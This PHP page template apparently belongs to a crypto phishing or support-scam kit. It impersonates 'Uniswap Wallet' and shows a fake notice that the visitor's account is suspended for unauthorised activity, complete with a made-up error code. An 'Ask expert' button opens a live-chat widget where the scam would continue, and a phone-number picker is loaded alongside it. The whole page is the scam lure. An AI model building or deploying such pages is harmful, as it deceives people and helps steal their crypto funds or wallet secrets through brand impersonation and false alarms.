<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'Uniswap Wallet';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <link rel="stylesheet" href="<?= base_url('assets/country-code-picker/css/jquery.ccpicker.css')?>">
        <div class="container">
            <div class="row justify-content-center mx20">
                <div class="col-sm-4 text-center bg-white rounded-5 pb20" style="margin-top: 110px; padding: 0px">
                    <div class="text-center my10 fs18">Important Message !</div>
                    <p class="text-center my15">Due to unauthorised activity on your account, your account has been suspended. Please get in touch with the support team to secure your account.</p>
                    <div class='fs18 pt25 text-center fw-semibold'>Error CODE: EBRX1:6X76D</div>
                    <div class="row">
                        <div class="text-center mx-auto my20">
                            <a href="javascript:void(Tawk_API.toggle())" class="btn btn-primary text-white px40">Ask expert</a>
                        </div>
                    </div> 
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="<?=base_url('assets/country-code-picker/js/jquery.ccpicker.min.js')?>"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json') ?>", searchPlaceHolder: "Find..." });
            });
        </script>
    </body>
</html>